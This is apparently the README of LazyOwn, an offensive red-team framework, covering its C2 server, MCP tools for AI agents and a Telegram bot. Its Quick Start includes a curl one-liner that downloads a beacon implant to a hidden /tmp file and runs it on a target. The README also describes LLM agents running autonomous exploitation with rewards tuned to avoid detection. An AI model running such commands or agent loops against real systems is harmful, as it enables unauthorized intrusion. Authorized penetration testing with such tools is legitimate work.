# LazyOwn

![LazyOwn_Redteam_framework](https://github.com/user-attachments/assets/d713f163-5f4d-433f-befd-6776d43051da) 

[![stars](https://img.shields.io/github/stars/grisuno/LazyOwn?style=social)](https://img.shields.io/github/stars/grisuno/LazyOwn?style=social)
[![release](https://img.shields.io/github/v/release/grisuno/LazyOwn?include_prereleases&logo=github)](https://img.shields.io/github/v/release/grisuno/LazyOwn?include_prereleases&logo=github)
![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![image](https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79)
 ![image](https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c)
  [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0) ![image](https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407) ![image](https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6) [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/grisuno/LazyOwn)
![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=grisuno&show_icons=true&show=reviews,discussions_started,discussions_answered,prs_merged,prs_merged_percentage&theme=dracula)
![image](https://github.com/user-attachments/assets/2e95d6e7-c072-4a16-9c65-29a8548a549b)


```sh
 ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░
    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░
                 ░         ░ ░
```

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)


LazyOwn comes with ABSOLUTELY NO WARRANTY. This is free software, and you are  welcome to redistribute it under the terms of the GNU General Public License v3.
See the LICENSE file for details about using this software.

 # LazyOwn

LazyOwn is a professional red team framework for penetration testers and security researchers. It provides over 666 attack techniques for Linux, Unix, BSD, macOS, and Windows environments, and integrates the Atomic Red Team attack library.

## Quickstart in three commands

New here? This is the whole on-ramp. Full walkthrough: [`QUICKSTART.md`](QUICKSTART.md).

```bash
git clone https://github.com/grisuno/LazyOwn.git && cd LazyOwn
bash install.sh        # virtualenv + pinned dependencies + C2 certificates
./run                  # launches the shell; first run offers the setup wizard
```

Lighter install: `bash install.sh --no-ml` skips the heavy torch/CUDA stack, `--no-ollama` skips the local LLM runtime. Dependencies are pinned in `requirements.txt` (cross-platform core) and `requirements-ml.txt` (optional ML); `pyproject.toml` is the single source of truth.

### Docker

For isolated, reproducible engagements, see [`lazyown-docker/README.md`](lazyown-docker/README.md).

```bash
cd lazyown-docker
./mkdocker.sh build
./mkdocker.sh run --vpn 1
```

Then, inside the `(LazyOwn) >` shell:

```text
doctor          # preflight: verifies Python, venv, packages, certs, SecLists, tools
wizard          # guided config (auto-detects lhost, walks 7 steps)
ping            # confirm the target is up and detect its OS
lazynmap        # full port + service scan
```

If `doctor` reports a blocking failure (red), fix it before going further — it
tells you the exact `pip install` / `apt install` command for whatever is
missing. Warnings (yellow) are optional features you can ignore for now.

# Core Architecture
LazyOwn is built around a modular, command-driven architecture that provides flexibility and extensibility for security testing workflows.

![diagrama_lazyown](https://github.com/user-attachments/assets/90aca8cd-cc74-48c1-888c-a897e8a46198)

LazyOwn integrates a command-line interface (CLI) built on cmd2 and a web-based GUI built on Flask. Parameters are scoped to `payload.json`, enabling consistent configuration across tools. The framework supports adversary simulation, task scheduling via the `cron` command, and persistent automated threat simulation workflows.

![image](https://github.com/user-attachments/assets/112dc7ef-2aa8-4255-911b-47f252eea7ab)


![image](https://github.com/user-attachments/assets/5ee8be8b-b3be-4e6e-9a96-9e6a546fb047)

# See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

# LazyOwn Skills — MCP Integration

Connect Claude Code to the LazyOwn framework via the Model Context Protocol (MCP). The MCP server exposes 67 tools covering the full engagement lifecycle.

## Files

| File | Purpose |
|------|---------|
| `skills/lazyown_mcp.py` | MCP server — exposes 67 LazyOwn tools to Claude |
| `skills/lazyown.md` | Claude Code skill / slash-command documentation |
| `skills/autonomous_daemon.py` | Autonomous execution daemon (objective-driven, no Claude required between steps) |
| `skills/hive_mind.py` | Multi-agent queen + drone system with ChromaDB memory |
| `skills/lazyown_policy.py` | Reward-based policy engine for the auto_loop |
| `skills/lazyown_facts.py` | Structured fact extraction from nmap XML and tool output |
| `skills/lazyown_parquet_db.py` | Parquet knowledge base: session history, GTFOBins, LOLBas, ATT&CK |

## Quick Start (5 minutes to first shell)

> Full guide: [`QUICKSTART.md`](QUICKSTART.md)

```bash
# 1. Clone and install (add --no-ml to skip the 2 GB torch/CUDA stack, --no-ollama to skip the local LLM)
git clone https://github.com/grisuno/LazyOwn.git && cd LazyOwn && bash install.sh

# 2. Launch, verify the install, then run the wizard
./run
(LazyOwn) > doctor   # preflight: Python, venv, packages, certs, SecLists, tools
(LazyOwn) > wizard   # auto-detects lhost, walks 7 config steps

# Heavy optional dependencies (pycryptodome, python-libnmap, impacket, ...) are
# imported lazily: a missing package degrades only its feature instead of
# crashing the shell, and the dependent command raises a clear "pip install ..."
# error when used. To audit them without launching the shell (works even if rich
# or cmd2 are broken):  python3 -m core.dependencies

# 3. Define your authorized scope, then recon
(LazyOwn) > scope add 10.10.11.0/24 && scope mode enforce
(LazyOwn) > ping && lazynmap && auto_populate && facts_show

# 4. Start C2 (separate terminal)
bash fast_run_as_r00t.sh --no-attach --vpn 1

# 5. Get a shell — Linux BOF-capable beacon
(LazyOwn) > blacksandbeacon
# Then on target: curl -sk "http://<lhost>:<lport>/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &

# 6. Invite teammates (multi-operator)
(LazyOwn) > collab_join alice
# Prints: https://<lhost>:<c2_port>/collab/?operator=alice
```

---

## Multi-Operator Collaboration

LazyOwn's collab layer provides real-time team server functionality via
Server-Sent Events (SSE). It activates automatically when `lazyc2.py` starts.

**Browser dashboard** — open in any browser on the team:
```
https://<lhost>:<c2_port>/collab/?operator=<your_handle>
```

**Terminal SSE stream**:
```bash
curl --insecure -N "https://<lhost>:<c2_port>/collab/stream?operator=alice" | jq .
```

**Publish a finding to all operators**:
```bash
curl --insecure -sk -X POST https://<lhost>:<c2_port>/collab/publish \
  -H "Content-Type: application/json" \
  -d '{"type":"finding","operator":"alice","payload":{"target":"10.10.11.5","detail":"root via CVE-2024-xxxx"}}'
```

**Lock a target** (prevents two operators running the same tool):
```bash
curl --insecure -sk -X POST https://<lhost>:<c2_port>/collab/lock \
  -H "Content-Type: application/json" \
  -d '{"target":"10.10.11.5","operator":"alice","ttl_secs":300}'
```

| Endpoint | Method | Description |
|---|---|---|
| `/collab/` | GET | Multi-operator browser dashboard |
| `/collab/stream?operator=<name>` | GET (SSE) | Real-time event stream |
| `/collab/operators` | GET | Active operator list |
| `/collab/publish` | POST | Broadcast a structured event |
| `/collab/lock` | POST | Acquire advisory target lock |
| `/collab/unlock` | POST | Release target lock |
| `/collab/locks` | GET | All active locks |
| `/collab/history?n=100` | GET | Last N events |

From the CLI: `collab_join <handle>` prints all URLs for a given operator.

---

## MCP Quick Start

LazyOwn exposes its full framework via the Model Context Protocol (MCP). The same server works with Claude Code, Claude Desktop, Hermes Agent, and OpenCode — pick the integration that matches your environment.

### Claude Code

```bash
claude mcp add lazyown python3 /home/grisun0/LazyOwn/skills/lazyown_mcp.py
```

Or add manually to `~/.claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "lazyown": {
      "command": "python3",
      "args": ["/home/grisun0/LazyOwn/skills/lazyown_mcp.py"],
      "env": {
        "LAZYOWN_DIR": "/home/grisun0/LazyOwn"
      }
    }
  }
}
```

Install the slash command (optional):

```bash
cp skills/lazyown.md ~/.claude/commands/lazyown.md
```

After restarting Claude Code, all `lazyown_*` tools are available.

### Hermes Agent

LazyOwn is Hermes-native. The `skills/hermes-lazyown/` integration layer provides a compact, namespaced tool surface optimized for Hermes context windows with checkpoint resume, dynamic rule generation, and native delegation planning.

Register in `~/.hermes/config.yaml`:

```yaml
mcp_servers:
  hermes-lazyown:
    command: python3
    args: ["/home/grisun0/LazyOwn/skills/hermes-lazyown/mcp_server.py"]
    env:
      LAZYOWN_DIR: "/home/grisun0/LazyOwn"
```

Then reload MCP tools in Hermes with `/reload-mcp`.

See `skills/hermes-lazyown/README.md` for the full Hermes integration guide.

### OpenCode

LazyOwn is OpenCode-friendly via the **LazyOwnOpenCodeAdapter**:

```bash
git clone https://github.com/grisuno/LazyOwnOpenCodeAdapter.git
cd LazyOwnOpenCodeAdapter && npm install
npm run build
```

The adapter bridges LazyOwn's MCP server into the OpenCode CLI, exposing the same `lazyown_*` tool surface with OpenCode-native prompts and workflows.

Full setup: https://github.com/grisuno/LazyOwnOpenCodeAdapter

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `LAZYOWN_DIR` | parent of `skills/` | LazyOwn root directory |
| `LAZYOWN_C2_HOST` | `payload.json lhost` | C2 server address |
| `LAZYOWN_C2_PORT` | `payload.json c2_port` | C2 server port |
| `LAZYOWN_C2_USER` | `payload.json c2_user` | C2 username |
| `LAZYOWN_C2_PASS` | `payload.json c2_pass` | C2 password |

## MCP Tool Groups (81 tools)

| Group | Tools | Description |
|-------|-------|-------------|
| Core Execution | 7 | run_command (now with dry_run + confirm), get/set_config, list_modules, discover_commands, command_help, palette |
| Audit & Context | 6 | target_context, tasks_cleanup, evidence_grep, session_diff, run_command_async, job_status |
| Target Management | 3 | add_target, list_targets, set_active_target |
| C2 / Implant Control | 10 | c2_command, c2_status, get_beacons, run_api, c2_profile, c2_vuln_analysis, c2_redop, c2_search_agent, c2_script, c2_adversary |
| Session Awareness | 4 | session_status, session_state, list_sessions, read_session_file |
| Autonomous Loop | 3 | auto_loop, policy_status, recommend_next |
| **ACI — Autonomous Campaign Intelligence** | **3** | **aci_plan, aci_status, aci_replan** |
| Reactive Intelligence | 2 | reactive_suggest, bridge_suggest |
| Objectives & Planning | 4 | inject_objective, next_objective, soul, read_prompt |
| Knowledge Bases | 9 | parquet_query/annotate, facts_show, cve_search, searchsploit, rag_index/query, threat_model |
| Memory & Learning | 3 | memory_recall/store, eval_quality |
| Campaign & Reporting | 7 | campaign, campaign_tasks, generate_report, misp_export, collab_publish, timeline |
| Playbooks | 2 | playbook_generate, playbook_run |
| Addons, Tools & Plugins | 3 | list_addons/plugins, create_addon/tool |
| Scheduling | 2 | cron_schedule, daemon |
| AI Agents | 5 | run_agent, agent_status/result, list_agents, llm_ask |
| Event Engine | 4 | poll_events, ack_event, add_rule, heartbeat_status |
| SWAN MoE+RL | 4 | swan_run, swan_ensemble, swan_status, swan_route |

Full documentation: `skills/README.md` and `skills/lazyown.md`.

### Audit-mode MCP improvements

Added in `skills/lazyown_mcp_helpers.py` to make autonomous audits more
efficient and less error-prone. Logic lives in a pure-function module so it
is unit-testable in isolation (`tests/test_mcp_improvements.py`).

| Tool / Param | What it does | Why it matters |
|--------------|--------------|----------------|
| `lazyown_session_init(format='json', include_recommend=true)` | Returns the SITREP as a structured dict instead of a banner; optionally embeds the top-3 ranked recommended actions. | Saves ~5KB of decorated text per call; agents can filter before consuming. |
| `lazyown_campaign_sitrep(format='json')` | Same JSON option for the master shift report. | Consistent format across both situation tools. |
| `lazyown_target_context(host, port=N)` | Aggregates open ports, world-model credentials (with provenance + confidence), vulnerabilities, pwntomate evidence freshness, and nmap freshness for one (host, port) tuple. | Replaces 4-5 separate lookups when deciding the next action on a target. |
| `lazyown_tasks_cleanup(dry_run=true, min_confidence=0.5)` | Audits `sessions/tasks.json` and flags entries where the embedded credential is actually a timestamp / URL / IP / duplicate. Pass `dry_run=false` to rewrite the file (a `.bak` is written first). | The watcher commonly turns log timestamps into "credentials"; on a real campaign this drops 100+ noise tasks. |
| `lazyown_evidence_grep(pattern, scope='all|loot|nmap|http|logs')` | Regex search across `sessions/` artefacts with binary-skip and size caps. Returns `path:line` matches. | Avoids dropping out to the shell for cross-evidence queries. |
| `lazyown_run_command(command, dry_run=true)` | Pre-flight: returns base command, binary path, OS-required vs OS-current, would-duplicate artefacts, missing payload keys — without executing. | Stops repeat-runs of 30-min scans by mistake; flags Windows-only tools against a Linux target before launch. |
| `lazyown_run_command_async(command, timeout)` + `lazyown_job_status(job_id)` | Background-job pattern for long commands (lazynmap, pwntomate, auto_loop). Returns a `job_id` immediately. | Frees the agent from blocking on commands documented as ≥30 min. |
| `lazyown_session_diff(take=true)` | Reports added / modified / removed files in `sessions/` plus new credentials / task IDs since the last snapshot. | Makes shift handoffs explicit; works well as the first call of every new session. |
| Confirmation gate (`confirm=true`) | `lazyown_c2_command`, `lazyown_c2_redop`, `lazyown_c2_adversary`, and any `run_command` whose body matches `rm -rf` / `exfil` / `wipe` / `encrypt-file` now require an explicit `confirm=true` argument. | Prevents accidental destructive actions from autonomous loops. |
| Provenance + confidence on credentials | Each credential exposed via `target_context` includes `is_likely_credential`, `confidence`, `classification`, and a `provenance` block (`source_file`, `line_no`, `captured_at`) when found. | Required for chain-of-custody in pentest reports. |
| Freshness annotations | Every evidence file in the JSON SITREP and `target_context` carries `age_seconds`, `age_human`, and `stale=true` once it exceeds `freshness_threshold_seconds` (default 7 days; configurable per-call). | Stops the agent from exploiting on top of stale recon evidence. |

### Audit-mode CLI enhancements

A SOLID extension layer in `cli/cli_enhancements.py` plugs into the cmd2 shell
via the existing CommandSet auto-discovery (`cli/commands/audit.py`). No
edits to the 27k-line `lazyown.py` core were required beyond two small hooks
(lazy alias loading, `completedefault` fallback).

| Command / hook | What it does | Backed by |
|----------------|--------------|-----------|
| `fz [query]` | Fuzzy command finder over every `do_*`, alias, plugin and addon. Scores exact > prefix > substring > sequence-similarity. | `FuzzyCommandIndex` |
| `form <command>` | Walks the operator through an interactive parameter form for commands with many flags (currently `phishing`, `venom`, `evil`). Validates required fields and `options` enums; falls back to defaults under non-interactive IO. | `InteractiveForm`, `FormSpec` |
| `status_tail [target]` | Parses the latest `sessions/scan_<target>.partial`/`.nmap` and prints open ports, percent complete and last line so the operator can monitor a long scan without leaving the shell. | `LiveStatusTail` |
| `grep_log <pattern> [--cmd <name>]` | Regex search across the recent transcript of executed commands and their outputs. Persists across restarts (`sessions/_cli_transcript.jsonl`). | `TranscriptStore` |
| `reload_addons` | Polls `lazyaddons/` and `plugins/` and re-registers anything that changed since the last sweep, without restarting the shell. | `AddonHotReloader` |
| `audit_complete_keys <command> [partial]` | Surfaces what the payload-aware completer would suggest for a given command. Useful to verify completion behaviour. | `PayloadAwareCompleter` |
| `completedefault` (Tab) | Cmd2 hook now falls through to a payload-aware completer that suggests payload keys for `set`/`assign`, IP values for `target`, wordlist keys for `gobuster`/`ffuf`, addon names for `run`, plugin names for `plugin`, and captured credentials for `evil`/`cme`/`secretsdump`. | `PayloadAwareCompleter` |
| Dynamic alias resolution | `cli/aliases.py` now defaults to `lazy=True`: alias templates keep their `{rhost}`/`{lhost}`/etc. placeholders and are rendered against `self.params` at execution time. `set rhost X` propagates to every alias on the next keystroke (no shell restart). Pre-substitution is still available with `lazy=False`. | `DynamicAliasResolver`, `cli/aliases.py` |

The primitives are framework-agnostic and depend on small `typing.Protocol`
interfaces (`PayloadProvider`, `CommandLister`, `TerminalIO`) so they can be
unit-tested in isolation. See `tests/test_cli_enhancements.py` (36 tests).

### Fuzzy dropdown autocomplete

The cmd2 shell installs a curses-driven fuzzy picker on top of GNU readline
(`cli/fuzzy_picker.py`). On a single **Tab** press, when two or more
completions are available, the picker opens a bordered dropdown anchored at
the bottom of the terminal showing every match alongside its description.
The scorer favours exact, prefix and subsequence matches over substring and
similarity (the same ranking the standalone `fz` command uses), and the
matched characters of the query are highlighted in each row so the operator
can see *why* a candidate is in the list.

Navigation: **↑ / ↓** to move, **Page Up / Page Down** to jump, **Home /
End** to seek, **Backspace** to edit the query in place, **Tab** or
**Enter** to insert the highlighted command into the prompt, **Esc** or
**Ctrl-C** to cancel. When only one candidate matches, readline's normal
auto-insert behaviour is preserved so the picker never gets in the way of a
fast operator. Geometry, colors and glyphs are driven by `PickerConfig`,
and an optional `fuzzy_picker` block in `payload.json` can override any of
its fields (e.g. `"max_visible_rows": 8`) without touching code.

### Configurable Neon Box prompt — `config_banner`

The cmd2 shell renders a three-line *Neon Box* prompt assembled from a
canonical set of segments (`user_host`, `iface`, `lhost`, `rhost`,
`domain`, `public_ip`, `cwd`, `git`, `venv`, `time`, `kernel`, `version`,
`battery_load`). The renderer is implemented in `cli/banner_config.py` as
a small SOLID stack: one `SegmentRenderer` per piece of information, a
`SegmentRegistry`, a `BannerSettings` value object, and a `BannerRenderer`
that emits ANSI-colored output. Public IP, kernel release and the LazyOwn
version are TTL-cached so the prompt stays sub-millisecond after the first
render.

The `config_banner` shell command opens a **Powerlevel10k-style curses
wizard** with three tabs — **Segments**, **Colors**, **Glyphs** — and a
live preview of the resulting prompt anchored at the bottom of the panel.
**Tab / Shift+Tab** cycle tabs; **↑ / ↓** move within the active tab;
**Enter** saves to `payload.json` under the `banner` block; **Escape**
cancels. Per-tab bindings:

| Tab | Action keys |
|-----|-------------|
| **Segments** | `Space` toggles a segment on/off; `a` enables every segment; `n` disables every segment; `d` restores factory defaults. |
| **Colors** | `Space` / `→` cycles to the next named color (`bright_green`, `bright_cyan`, `bright_magenta`, …); `←` cycles back; `d` restores that segment's default color. |
| **Glyphs** | `Space` / `→` cycles to the next character for the focused slot (`top_left`, `vertical`, `bullet_primary`, `arrow`, `prompt_char_user`, …); `←` cycles back; `d` restores that slot's default glyph. |

The shell prompt refreshes immediately after save — no restart needed.
Operators with no TTY (CI, scripts) can still drive the system with
`config_banner show` and `config_banner reset`, or hand-edit the payload:

```json
"banner": {
  "enabled": ["user_host", "iface", "rhost", "domain", "cwd", "git", "venv", "time"],
  "colors":  {"user_host": "bright_green", "rhost": "bright_red", "domain": "bright_yellow"},
  "glyphs":  {"top_left": "┌", "bottom_left": "└", "horizontal": "─", "vertical": "│",
              "bullet_primary": "❯", "arrow": "→"}
}
```

Color names are validated against `ColorRegistry` and glyph characters
against `GlyphRegistry`; anything unknown silently falls back to the
factory default so a malformed payload never breaks the prompt.

### Graph-aware navigation — operator + agent UX from graphify

`cli/graph_advisor.py` loads the knowledge graph produced by
[`/graphify`](https://graphify.dev) over the LazyOwn source tree
(`graphify-out/graph_lazyown.json` — ~1500 nodes, ~2900 edges, 14
communities) and exposes it to both the cmd2 shell and the MCP server. The
advisor is a single-file SOLID stack — `GraphLoader` (mtime-cached file
IO), `GraphIndex` (in-memory adjacency / degree / community indexes),
`GraphScorer` (pure ranking primitive), `GraphAdvisor` (orchestrator) —
with every constant kept on the `GraphAdvisorConfig` dataclass.

**Operator commands (cmd2 shell)**

| Command | Purpose |
|---------|---------|
| `graph_search <query> [limit]` | Fuzzy search nodes by label, id or source file. |
| `neighbors <node> [depth] [limit]` | Walk the graph outward from a node with edge relation / confidence. |
| `god_nodes [N]` | Show the most-connected nodes — the framework's core abstractions. |
| `suggest_next [seeds…] [N]` | Recommend the next commands by walking outward from recent activity. With no seeds it reads `sessions/LazyOwn_session_report.csv` and seeds from there. |

The shell's `default()` hook now feeds unknown `do_*` commands through the
same advisor + the existing `FuzzyCommandIndex` so an operator who types
`ddo_lazynmap` instantly sees *"Did you mean: do_lazynmap, do_lazynmap_quick, …?"*
before the toast.

**MCP tools (Claude Code, Claude web, any MCP agent)**

| Tool | Purpose |
|------|---------|
| `lazyown_graph_summary` | Node / edge / community counts and the resolved graph path. |
| `lazyown_graph_search` | Fuzzy node search with a `budget_tokens` cap so the JSON response never blows the agent's context window. |
| `lazyown_graph_neighbors` | Layered adjacency walk with edge relation and confidence — the canonical "what does X depend on?" query. |
| `lazyown_graph_suggest_next` | Next-step recommendation; takes an explicit `recent` list or reads the session transcript. |

Every MCP graph tool trims list fields in place to fit `budget_tokens`
(default 1500). When the graph is missing, every tool returns
`{"available": false, "reason": "..."}` instead of crashing — the operator
is told to run `/graphify .` once and everything starts working.

The advisor caches by `(path, mtime)` so a fresh `/graphify` rebuild is
picked up automatically on the next CLI command or MCP call without
restarting the shell or the MCP server. See
`tests/test_graph_advisor.py` for the 20 unit tests covering loader,
index, scorer and the full advisor API.

### Inline reactive hints — non-blocking next-step suggestions

`cli/reactive_hints.py` hooks into the cmd2 post-command pipeline via
`register_postcmd_hook` and prints a single dim line below every command
output, before the next prompt appears:

```
  ↳ do_gobuster · do_enum4linux · do_ffuf
```

The suggestion comes from the graphify knowledge graph (same `GraphAdvisor`
used by `suggest_next`), so it is structurally grounded — not a generic list.
The hook is fully non-blocking: it returns before cmd2 renders the prompt, so
the operator can start typing the next command immediately.

**Control**

| Action | How |
|--------|-----|
| Disable hints for the session | `set enable_inline_hints false` |
| Re-enable | `set enable_inline_hints true` |
| Persist permanently | `set enable_inline_hints false` then `save` |

Commands on the skip list (`help`, `?`, `exit`, `set`, `show`, `palette`,
`dashboard`, `suggest_next`, `graph_search`, `neighbors`, `god_nodes`) never
produce a hint line — they are meta-commands where a suggestion adds noise.

When the graphify graph is absent the hook returns silently. Run
`/graphify .` once to build the graph and hints start appearing on the very
next command.

### Operator TUI dashboard — `dashboard`

`cli/dashboard_tui.py` is a full-screen [Textual](https://textual.textualize.io)
dashboard launched from the shell with:

```
dashboard
```

It blocks the shell while open (like `htop` or `lazygit`). Press **Q** or
Ctrl-C to close and return to the cmd2 prompt.

**Layout**

```
┌─ LazyOwn RedTeam Dashboard ─────────────────────────────────────────────────┐
│ TARGET 10.10.11.5  ATTACKER 10.10.14.5  DOMAIN target.htb  PHASE RECON  OS  │
├─────────────────────┬─────────────────────────────────┬─────────────────────┤
│  Kill Chain         │  Recent Commands                │  Ops                │
│  ✔ Recon            │  ● lazynmap        2026-05-11   │  Objective:         │
│  ▶ Enum             │  ● ping            2026-05-11   │  Initial Access     │
│  ○ Exploit          │  ● gobuster        2026-05-11   │                     │
│  ○ PrivEsc          │                                 │  Credentials: 0     │
│  ○ Lateral          │                                 │  Hashes: 0          │
│  ○ Exfil            │  Config                         │  Beacons: 0         │
│  ○ Report           │  Target: 10.10.11.5             │                     │
│                     │  C2 Port: 4444                  │                     │
├─────────────────────┴─────────────────────────────────┴─────────────────────┤
│  ↳ next: do_gobuster · do_enum4linux · do_ffuf · do_nikto                   │
└──────────────────────────────────── [Q] Quit  [R] Refresh  [?] Help ────────┘
```

**Data sources** (auto-refreshed every 5 seconds)

| Panel | Source |
|-------|--------|
| Target / phase / OS | `payload.json`, `sessions/world_model.json` |
| Kill chain progress | `sessions/world_model.json` → `completed_phases` |
| Recent commands | `sessions/LazyOwn_session_report.csv` |
| Objective | `sessions/world_model.json`, `sessions/tasks.json` |
| Credentials / hashes | `sessions/credentials*.txt`, `sessions/hash*.txt` |
| Beacons | `sessions/beacons.json` |
| Graph hints | `graphify-out/graph_lazyown.json` |

Requires `pip install textual` (added to `install.sh`).

### Command palette and graph-aware discovery

The `lazyown_palette` MCP tool (also reachable as the `palette` CLI command
and the `/palette` web view, with a global **Ctrl+K / Cmd+K** overlay on
every C2 page) lets agents and operators browse the 422+ `do_*` commands
without scrolling. Modes:

| Mode | Example | Description |
|------|---------|-------------|
| Overview | `palette` | Phase-by-phase command counts. |
| Phase | `palette recon` | Every command in a kill-chain phase, with a one-line summary. |
| Phase + filter | `palette enum nmap` | Phase listing narrowed by a free-text query. |
| Search | `palette --search ldap` | Fuzzy search across name and summary. |
| Detail | `palette --info do_lazynmap` | Full entry **plus graphify-derived `calls` and `related` neighbours** (which other commands share helper functions with this one). |
| Next phase | `palette --next recon` | Recommended commands in the phase that follows in the kill-chain ordering. |

The detail view's `calls` / `related` lists come from
`graphify-out/graph_lazyown.json` (re-generated by the `graphify` skill);
when that file is absent the palette degrades silently to phase data only.

---

## Telegram Hermes Bot

The `telegram_hermes.py` bot bridges Telegram to the full LazyOwn framework via the MCP layer and Hermes gateway. It supports direct shell command execution, autonomous agent delegation, cron scheduling, C2 beacon interaction, and cross-platform messaging.

### Files

| File | Purpose |
|------|---------|
| `telegram_hermes.py` | Telegram bot — bridges Telegram to LazyOwn MCP and Hermes gateway |
| `run_telegram_hermes.sh` | Launcher script using a dedicated venv |
| `venv_telegram/` | Python virtual environment with `python-telegram-bot` dependencies |

### Quick Start

```bash
# 1. Create the dedicated virtual environment
cd LazyOwn
python3 -m venv venv_telegram
source venv_telegram/bin/activate
pip install python-telegram-bot nest_asyncio requests

# 2. Configure your bot token in payload.json
python3 -c "import json; p=json.load(open('payload.json')); p['telegram_token']='YOUR_BOTFATHER_TOKEN'; json.dump(p,open('payload.json','w'),indent=2)"

# 3. Launch the bot
./run_telegram_hermes.sh
```

### Bot Commands

| Command | Description |
|---------|-------------|
| `/start <secret>` | Authenticate with the C2 secret from `payload.json` |
| `/cmd <command>` | Execute any LazyOwn shell command |
| `/sitrep` | Full campaign situation report |
| `/config [key] [val]` | View or set payload.json values |
| `/addcli <client_id>` | Set active C2 client |
| `/clients` | List online C2 implants |
| `/c2 <command>` | Send command to C2 beacon |
| `/agent <goal>` | Run autonomous Groq/Ollama agent |
| `/delegate <goal>` | Delegate task to Hermes subagent |
| `/cron <schedule> <cmd>` | Schedule recurring LazyOwn commands |
| `/status` | Show daemon and autonomous status |
| `/stop` | Stop any running autonomous daemon |
| `/download <file>` | Download files from sessions/ |
| Upload document | Upload files to C2 beacon |

Any plain text message not prefixed with `/` is treated as a direct LazyOwn command. Rate limiting (5 commands/minute) and session timeouts (30 minutes) are enforced.

### Architecture

The bot uses the same PTY-based command execution as the MCP server (`skills/lazyown_mcp.py`), so every LazyOwn command, alias, and addon works without direct Python imports. Autonomous tasks (`/agent`, `/delegate`) spawn Groq or Ollama agents through the LazyOwn shell, and C2 commands (`/c2`, `/clients`) use the authenticated `/api/command` and `/get_connected_clients` endpoints.

---

## Advanced AI Architecture (MoE + RL + SWAN + Hive Mind)

LazyOwn integrates a world-class multi-agent AI stack that adapts and improves through every engagement:

### Mixture of Experts (MoE) — `modules/moe_router.py`

Five LLM experts are registered with capability tags, base weights, and cost tiers:

| Expert | Backend | Strengths |
|--------|---------|-----------|
| `groq_fast` | Groq llama-3.1-8b-instant | Recon, enumeration, rapid decisions |
| `groq_powerful` | Groq llama-3.3-70b-versatile | Exploitation, post-ex, complex reasoning |
| `groq_deepseek_r1` | Groq deepseek-r1-distill-llama-70b | Privilege escalation, step-by-step reasoning |
| `ollama_reason` | Ollama deepseek-r1:1.5b | Offline, privacy-safe, detailed analysis |
| `groq_gemma` | Groq gemma2-9b-it | Lateral movement, credential analysis |

Routing uses temperature-scaled softmax (`T = max(0.5, 1.5/(1+calls/50))`) over adjusted weights. Weights self-adjust via exponential moving average of per-expert reward over time.

### Reinforcement Learning from Models (RLM) — `modules/rl_trainer.py`

Tabular Q-learning trains the routing policy over engagement sessions:

```
State:  (task_type, engagement_phase, recent_reward_bucket)
Action: expert_id
Reward: r_raw - λ * detection_prob * |r_raw|    (λ=0.5)
Update: Q(s,a) ← Q(s,a) + α * [r + γ * max_a' Q(s',a') - Q(s,a)]
```

Hyperparameters: α=0.10, γ=0.90, ε_start=0.20, ε_min=0.05, ε_decay=0.995. Epsilon-greedy exploration decays per update. Q-values persist to `sessions/expert_qvalues.json` across sessions.

### SWAN Orchestrator — `skills/swan_agent.py`

The top-level integration layer wires MoE + RL + Detection Oracle + Hive Memory:

- `swan_run`: single-expert execution with RL-guided routing and post-execution Q-update
- `swan_ensemble`: N experts in parallel via ThreadPoolExecutor, synthesised by `WeightedTextAggregator`
- `OutcomeEvaluator`: reward = 0 when detection probability ≥ 70% (detection-aware reward shaping)
- Every result stored in Hive Memory (ChromaDB) for cross-session learning

### Detection Oracle (Blue Team Mirror) — `modules/detection_oracle.py`

Predicts detection probability **before** execution using 17 Sigma-lite rules covering:
credential access (LSASS, SAM, DCSync), lateral movement (PsExec, WMI, evil-winrm), privilege escalation (token impersonation, named pipes), exploitation, recon, C2, and brute force.

Probability aggregation: `P(detect) = 1 - ∏(1 - P_i)` across all triggered rules.

### Hive Mind — `skills/hive_mind.py`

Multi-agent queen+drone architecture with shared memory:
- **QueenBrain** (Claude): high-level orchestration + ConsensusProtocol for high-risk actions
- **DronePool** (Groq/Ollama): parallel execution of recon/exploit/cred/lateral/privesc tasks
- **HiveMemory**: ChromaDB semantic + SQLite episodic + Parquet long-term storage
- **EpisodeReflectionEngine**: post-campaign lesson extraction stored as `sessions/campaign_lessons.jsonl`

### Autonomous Campaign Intelligence (ACI) — `skills/aci_planner.py`

